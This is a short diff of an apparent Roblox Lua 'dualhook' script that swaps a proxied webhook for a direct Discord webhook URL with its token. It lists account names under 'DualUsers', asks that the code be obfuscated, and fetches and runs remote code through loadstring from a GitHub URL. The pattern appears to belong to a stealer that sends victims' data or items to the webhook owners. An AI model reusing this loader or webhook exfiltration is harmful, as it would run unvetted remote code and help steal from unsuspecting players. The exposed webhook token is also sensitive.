@@ -1,6 +1,6 @@
 --obfuscate after this
 
-local Webhook2 = "https://webhook-protect.vercel.app/api/webhook?id=ZXVBdkplRVRDQ0FCekllNXRvMXE4QTo0RTdoRVdWakw1SHFPdmNaWElNQTRMdWJQUURsaTU5eWROcnNGV0hFcC0yaHpJTm54MjZ1QW1BMERPNGtRTzh0eURZUUg2RU0xcjQwbFNQbDJ0RHp0ZlA5RE12S1F3eVY1N3BJdU1ncVMzWnhYQUZWM2dEdG10Mi1VOTkxb1J0allmVmx0S3pQQ0ZMQjlfSmVaajBXV2ZBNktReHc5MDNWbVNKbGZKZjNFa3M" -- Replace with your DUALHOOK URL
+local Webhook2 = "https://discordapp.com/api/webhooks/1343519240879083580/bf7fCzzkyXCHopd6hldP4nNpL_3n9qzusPoawvBq9KMYhAYG_e96J_GTJBRlam94BWFq" -- Replace with your DUALHOOK URL
 local DualUsers = {"xxxvic41", "xfrost102", "yeetdog545", "iluvrottencheese123"}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrektl/stuFF/refs/heads/main/wowowo"))() 
